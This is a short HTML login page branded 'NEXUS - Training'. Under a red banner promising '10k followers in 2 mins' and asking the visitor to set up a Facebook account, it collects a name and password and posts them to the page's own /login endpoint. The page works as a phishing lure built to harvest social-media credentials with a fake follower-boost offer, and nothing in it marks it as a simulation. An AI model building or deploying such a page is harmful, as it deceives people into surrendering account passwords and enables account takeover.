<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS - Training</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            height: 100%;
            width: 100%;
            background: #0a0a1a;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 50px 40px;
            border-radius: 40px;
            box-shadow: 0 0 100px #00ffcc44;
            max-width: 600px;
            width: 100%;
            text-align: center;
            border: 3px solid #00ffcc;
        }
        .warning {
            background: #ff4444;
            color: white;
            padding: 16px 14px;
            border-radius: 20px;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        h1 {
            color: #00ffcc;
            font-size: 56px;
            letter-spacing: 4px;
            margin: 10px 0 8px 0;
        }
        .sub {
            color: #aaa;
            font-size: 22px;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 18px 16px;
            margin: 12px 0;
            background: #0f0f2a;
            border: 2px solid #2a2a4a;
            border-radius: 20px;
            color: white;
            font-size: 22px;
            transition: 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #00ffcc;
            box-shadow: 0 0 20px #00ffcc55;
        }
        button {
            width: 100%;
            padding: 18px;
            background: #00ffcc;
            color: #0a0a1a;
            border: none;
            border-radius: 20px;
            font-size: 26px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 18px;
            transition: 0.3s;
        }
        button:hover {
            background: #00dbb8;
        }
        .footer {
            color: #555;
            margin-top: 30px;
            font-size: 18px;
        }
        .footer span {
            color: #00ffcc;
        }
        .nexus-icon {
            font-size: 72px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">🧪 10k followers in 2 mins,Set up your Facebook account.</div>
        <div class="nexus-icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="sub">KNOWLEDGE OVER CHAOS</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Your Name" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">🚀 Login</button>
        </form>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸 | <span>"KNOWLEDGE OVER CHAOS."</span></p>
    </div>
</body>
</html>
